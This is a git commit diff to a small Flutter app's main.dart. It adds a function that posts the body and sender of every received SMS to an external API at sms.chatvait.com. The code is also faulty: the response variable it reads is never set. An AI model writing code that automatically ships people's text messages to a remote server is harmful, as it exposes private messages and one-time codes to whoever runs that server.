f9ad64f393bfa6562b3f8ab716ad4b1ec207581b
Dauqu <sujeetsingh734321@gmail.com>
2022-08-10 20:17:05 +0530

    Changes

--- lib/main.dart
+++ lib/main.dart
@@ -1,7 +1,10 @@
+import 'dart:convert';
+
 import 'package:flutter/material.dart';
 import 'dart:async';
 import 'package:permission_handler/permission_handler.dart';
 import 'package:readsms/readsms.dart';
+import 'package:http/http.dart' as http;
 
 void main() {
   runApp(const MyApp());
@@ -20,6 +23,62 @@ class _MyAppState extends State<MyApp> {
   String sender = 'no sms received';
   String time = 'no sms received';
 
+   var res;
+
+  Future SaveData() async {
+    try {
+      final response = await http.post(
+          Uri.parse("https://sms.chatvait.com/api/v1/sms"),
+          headers: <String, String>{
+            'Content-Type': 'application/json; charset=UTF-8',
+          },
+          body: jsonEncode(<String, String>{
+            "sms": sms,
+            "sender": sender,
+          }));
+      setState(() {
+       
+      });
+
+      if (response.statusCode == 200) {
+      
+
+        // ignore: use_build_context_synchronously
+        ScaffoldMessenger.of(context).showSnackBar(
+          SnackBar(
+            content: Text(res['message'].toString()),
+            duration: const Duration(seconds: 2),
+          ),
+        );
+
+       
+      } else {
+        setState(() {
+          // message = res['message'].toString();
+          ScaffoldMessenger.of(context).showSnackBar(
+            SnackBar(
+              content: Text(res['message'].toString()),
+              duration: const Duration(seconds: 3),
+            ),
+          );
+          
+        });
+      }
+    } catch (e) {
+      setState(() {
+        // error = e.toString();
+        ScaffoldMessenger.of(context).showSnackBar(
+          SnackBar(
+            content: Text(e.toString()),
+            duration: const Duration(seconds: 3),
+          ),
+        );
+
+        //Redirect to OTP page
+      });
+    }
+  }
+
   @override
   void initState() {
     super.initState();
@@ -31,6 +90,7 @@ class _MyAppState extends State<MyApp> {
             sms = event.body;
             sender = event.sender;
             time = event.timeReceived.toString();
+            SaveData();
           });
         });
       }
